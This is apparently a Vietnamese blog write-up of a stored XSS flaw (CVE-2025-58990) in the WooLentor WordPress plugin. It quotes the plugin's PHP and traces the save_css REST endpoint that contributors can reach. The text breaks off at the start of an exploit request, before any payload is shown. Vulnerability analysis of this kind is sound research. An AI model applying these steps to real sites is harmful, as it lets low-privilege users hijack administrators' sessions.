</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">save_block_css</span><span class="p">(</span> <span class="nv">$request</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">global</span> <span class="nv">$wp_filesystem</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nv">$wp_filesystem</span> <span class="o">||</span> <span class="o">!</span><span class="nx">function_exists</span><span class="p">(</span><span class="s1">&#39;WP_Filesystem&#39;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">require_once</span><span class="p">(</span> <span class="nx">ABSPATH</span> <span class="o">.</span> <span class="s1">&#39;wp-admin/includes/file.php&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$params</span> 	<span class="o">=</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">get_params</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$post_id</span> 	<span class="o">=</span> <span class="nx">sanitize_text_field</span><span class="p">(</span> <span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;post_id&#39;</span><span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="nv">$post_id</span> <span class="o">==</span> <span class="s1">&#39;woolentor-widget&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;has_block&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">update_option</span><span class="p">(</span> <span class="nv">$post_id</span><span class="p">,</span> <span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;block_css&#39;</span><span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;success&#39;</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;message&#39;</span> <span class="o">=&gt;</span> <span class="nx">__</span><span class="p">(</span><span class="s1">&#39;Widget CSS Saved.&#39;</span><span class="p">,</span> <span class="s1">&#39;woolentor&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$filename</span> 		<span class="o">=</span> <span class="s2">&#34;woolentor-css-</span><span class="si">{</span><span class="nv">$post_id</span><span class="si">}</span><span class="s2">.css&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$upload_dir_url</span> <span class="o">=</span> <span class="nx">wp_upload_dir</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$dirname</span> 		<span class="o">=</span> <span class="nx">trailingslashit</span><span class="p">(</span> <span class="nv">$upload_dir_url</span><span class="p">[</span><span class="s1">&#39;basedir&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;woolentor-addons/&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;has_block&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">update_post_meta</span><span class="p">(</span> <span class="nv">$post_id</span><span class="p">,</span> <span class="s1">&#39;_woolentor_active&#39;</span><span class="p">,</span> <span class="s1">&#39;yes&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$all_block_css</span> <span class="o">=</span> <span class="nv">$params</span><span class="p">[</span><span class="s1">&#39;block_css&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nx">WP_Filesystem</span><span class="p">(</span> <span class="k">false</span><span class="p">,</span> <span class="nv">$upload_dir_url</span><span class="p">[</span><span class="s1">&#39;basedir&#39;</span><span class="p">],</span> <span class="k">true</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span> <span class="o">!</span> <span class="nv">$wp_filesystem</span><span class="o">-&gt;</span><span class="na">is_dir</span><span class="p">(</span> <span class="nv">$dirname</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$wp_filesystem</span><span class="o">-&gt;</span><span class="na">mkdir</span><span class="p">(</span> <span class="nv">$dirname</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nx">update_post_meta</span><span class="p">(</span> <span class="nv">$post_id</span><span class="p">,</span> <span class="s1">&#39;_woolentor_css&#39;</span><span class="p">,</span> <span class="nv">$all_block_css</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nv">$wp_filesystem</span><span class="o">-&gt;</span><span class="na">put_contents</span><span class="p">(</span> <span class="nv">$dirname</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">,</span> <span class="nv">$all_block_css</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">throw</span> <span class="k">new</span> <span class="nx">\Exception</span><span class="p">(</span> <span class="nx">__</span><span class="p">(</span><span class="s1">&#39;You are not permitted to save CSS.&#39;</span><span class="p">,</span> <span class="s1">&#39;woolentor&#39;</span> <span class="p">)</span> <span class="p">);</span> 
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;success&#39;</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;message&#39;</span> <span class="o">=&gt;</span><span class="nx">__</span><span class="p">(</span><span class="s1">&#39;WooLentor Blocks css file update.&#39;</span><span class="p">,</span> <span class="s1">&#39;woolentor&#39;</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">delete_post_meta</span><span class="p">(</span> <span class="nv">$post_id</span><span class="p">,</span> <span class="s1">&#39;_woolentor_active&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span> <span class="nx">file_exists</span><span class="p">(</span> <span class="nv">$dirname</span><span class="o">.</span><span class="nv">$filename</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">wp_delete_file</span><span class="p">(</span> <span class="nv">$dirname</span><span class="o">.</span><span class="nv">$filename</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="nx">delete_post_meta</span><span class="p">(</span> <span class="nv">$post_id</span><span class="p">,</span> <span class="s1">&#39;_woolentor_css&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;success&#39;</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;message&#39;</span> <span class="o">=&gt;</span> <span class="nx">__</span><span class="p">(</span><span class="s1">&#39;WooLentor Blocks CSS Delete.&#39;</span><span class="p">,</span> <span class="s1">&#39;woolentor&#39;</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span><span class="p">(</span> <span class="nx">\Exception</span> <span class="nv">$e</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;success&#39;</span> <span class="o">=&gt;</span> <span class="k">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;message&#39;</span> <span class="o">=&gt;</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Mở rộng hoặc thu gọn khối mã" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><p>Hàm <code>save_block_css()</code> thuộc class <code>Manage_Styles</code> có nhiệm vụ lưu hoặc xóa CSS tuỳ theo block.</p>
<p>Ứng dụng sẽ lấy <code>post_id</code> và nội dung <code>block_css</code> từ request.</p>
<p><strong>Trường hợp đặc biệt</strong>: nếu <code>post_id = woolentor-widget</code> =&gt; lưu CSS vào <code>wp_options</code></p>
<p><strong>Trường hợp bài viết thường</strong>:</p>
<ul>
<li>
<p>Nếu có block (<code>has_block = true</code>):</p>
<ul>
<li>Đánh dấu post đang active (<code>_woolentor_active</code>).</li>
<li>Lưu CSS vào bảng <code>wp_postmeta</code> với <code>meta_key</code> là <code>_woolentor_css</code>.</li>
</ul>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-sql"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">wp_postmeta</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">meta_key</span><span class="o">=</span><span class="s1">&#39;_woolentor_css&#39;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="o">+</span><span class="c1">---------+---------+----------------+------------+
</span></span></span><span class="line"><span class="cl"><span class="o">|</span><span class="w"> </span><span class="n">meta_id</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">post_id</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">meta_key</span><span class="w">       </span><span class="o">|</span><span class="w"> </span><span class="n">meta_value</span><span class="w"> </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="o">+</span><span class="c1">---------+---------+----------------+------------+
</span></span></span><span class="line"><span class="cl"><span class="o">|</span><span class="w">      </span><span class="mi">27</span><span class="w"> </span><span class="o">|</span><span class="w">      </span><span class="mi">69</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">_woolentor_css</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">body</span><span class="p">:</span><span class="err">{}</span><span class="w">    </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="o">|</span><span class="w">     </span><span class="mi">687</span><span class="w"> </span><span class="o">|</span><span class="w">    </span><span class="mi">1416</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">_woolentor_css</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">body</span><span class="p">:</span><span class="err">{}</span><span class="w">    </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="o">+</span><span class="c1">---------+---------+----------------+------------+</span></span></span></code></pre></td></tr></table></div>
</div>
</div><ul>
<li>Ghi CSS ra file trong thư mục upload (<code>woolentor-css-{post_id}.css</code>).</li>
</ul>
<figure><img src="/posts/2025-10-05-cve-2025-58990/write_css.png"
      alt="Write CSS"><figcaption>
        <p>Write CSS</p>
      </figcaption>
  </figure>

</li>
<li>
<p>Nếu không có block (<code>has_block = false</code>):</p>
<ul>
<li>Xoá trạng thái active và CSS meta.</li>
<li>Xoá file CSS nếu tồn tại.</li>
</ul>
</li>
</ul>
<p>👉 Khả năng xảy ra là combo <strong>Stored XSS</strong> phổ biến trong plugin WordPress: user role <strong>contributor</strong> (không có quyền publish) tạo post có CSS chứa payload XSS. Payload này được lưu trong <strong>database</strong> hoặc một <strong>file</strong>; Người dùng có đặc quyền cao hơn sẽ preview (xem trước) nội dung trước khi publish, payload sẽ được tải/hiển thị trong trình duyệt và thực thi, gây ra XSS.</p>
<p>Để hiểu cách dữ liệu được hiển thị, ta tìm với từ khóa <code>_woolentor_css</code> trong thư mục plugin. Vì CSS được lưu trong <code>wp_postmeta</code> với <code>meta_key = _woolentor_css</code>, nên chắc chắn plugin sẽ truy vấn giá trị này và chèn trực tiếp vào HTML.</p>
<figure><img src="/posts/2025-10-05-cve-2025-58990/meta_key.png"
    alt="Search Meta Key"><figcaption>
      <p>Search Meta Key</p>
    </figcaption>
</figure>

<p><code>generate_inline_css()</code> lấy block CSS từ <strong>wp_postmeta</strong> với <code>meta_key = _woolentor_css</code> và lấy từ file <code>woolentor-css-{$post_id}.css</code>, nếu file tồn tại thì <code>get_contents</code> và inline CSS cho post có <code>$post_id</code> được truyền vào, còn nếu file không tồn tại thì lấy từ <strong>wp_postmeta</strong>.</p>
<p>Nội dung được đặt trong thẻ <code>&lt;style type=&quot;text/css&quot;&gt;&lt;/style&gt;</code></p>
<hr>
<p>class <code>Manage_Styles</code> đăng ký <strong>REST API</strong> trong hàm <code>register_routes</code></p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">register_routes</span><span class="p">(</span> <span class="nv">$namespace</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">register_rest_route</span><span class="p">(</span> <span class="nv">$namespace</span><span class="p">,</span> <span class="s1">&#39;save_css&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="p">[</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;methods&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;callback&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="nv">$this</span><span class="p">,</span> <span class="s1">&#39;save_block_css&#39;</span> <span class="p">],</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;permission_callback&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="nv">$this</span><span class="p">,</span> <span class="s1">&#39;permission_check&#39;</span> <span class="p">],</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;args&#39;</span> <span class="o">=&gt;</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">            <span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// other route
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Mở rộng hoặc thu gọn khối mã" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><p>Hàm <code>register_rest_route()</code> tạo một <strong>REST API</strong> endpoint tại đường dẫn:</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/wp-json/{namespace}/save_css</span></span></code></pre></td></tr></table></div>
</div>
</div><p>Khi có request <strong>POST</strong> tới endpoint này:</p>
<ul>
<li>WordPress sẽ gọi hàm <code>save_block_css()</code> để xử lý dữ liệu.</li>
<li>Trước đó, <code>permission_callback</code> sẽ chạy hàm <code>permission_check()</code> để kiểm tra quyền của user (nếu trả về false thì chặn request).</li>
</ul>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">permission_check</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span> <span class="nx">current_user_can</span><span class="p">(</span> <span class="s1">&#39;edit_posts&#39;</span> <span class="p">)</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p>Hàm <code>permission_check</code> quy định rằng chỉ những user có quyền <strong>contributor</strong> trở lên mới được phép sử dụng API này.</p>
<p>Ta chưa xác định được chính xác <strong>namespace</strong> ở đây là gì vì nó được khai báo ở đâu đó trong mã nguồn, không phải trong class này. Ta tận dụng route <code>save_css</code> để truy vết.</p>
<p>Truy cập <code>/wp-json/</code> và tìm với từ khóa <code>save_css</code></p>
<figure><img src="/posts/2025-10-05-cve-2025-58990/search.png"
    alt="Search"><figcaption>
      <p>Search</p>
    </figcaption>
</figure>

<p>Kết quả cho thấy endpoint thực tế là:</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-http"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">http://localhost/wp-json/woolentor/v1/save_css</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p>Để biết <strong>namespace</strong> này được khai báo ở đâu, ta tiếp tục tìm trong mã nguồn với từ khóa <code>'woolentor/v1'</code>:</p>
<figure><img src="/posts/2025-10-05-cve-2025-58990/name_space.png"
    alt="Name Space"><figcaption>
      <p>Name Space</p>
    </figcaption>
</figure>

<p>Có nhiều kết quả, nhưng vì ta đang phân tích tính năng <strong>REST API</strong>, nên tập trung vào file <strong>Api.php</strong>.</p>
<p><code>register_routes( $namespace )</code> thuộc class <code>Manage_Styles</code> yêu cầu tham số <code>$namespace</code> nên có thể <code>woolentor/v1</code> được truyền ở đây thông qua thể hiện của class gọi đến hàm. ta tìm với từ khóa <code>Manage_Styles</code> trong file <strong>Api.php</strong> để biết nó được gọi như vậy không.</p>
<figure><img src="/posts/2025-10-05-cve-2025-58990/callapi.png"
    alt="Call Api"><figcaption>
      <p>Call Api</p>
    </figcaption>
</figure>

<p><code>namespace</code> chính xác được gọi và truyền như vậy.</p>
<p>👉 Như vậy, khi gửi <strong>POST</strong> request đến endpoint <code>http://localhost/wp-json/woolentor/v1/save_css</code>, callback <code>save_block_css</code> được gọi để thêm/sửa block CSS trong file và database.
Khi truy cập vào post có <code>post_id</code> liên quan đến block CSS được lưu, <code>generate_inline_css</code> sẽ lấy nội block CSS và inline CSS trong thẻ <code>&lt;style type=&quot;text/css&quot;&gt;&lt;/style&gt;</code> của post.</p>
<h2 class="heading-element" id="exploit"><span>Exploit</span>
  <a href="#exploit" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h3 class="heading-element" id="detect-xss"><span>Detect XSS</span>
  <a href="#detect-xss" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>Sử dụng user có role <strong>contributor</strong> tạo 1 post bất kì, ghi nhớ id của post đó.</p>
<p>Gửi <strong>POST</strong> request đến endpoint <code>http://localhost/wp-json/woolentor/v1/save_css</code> với XSS payload</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-http"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/wp-json/woolentor/v1/save_css</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">localhost</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
</span></span><span class="line"><span class="cl">
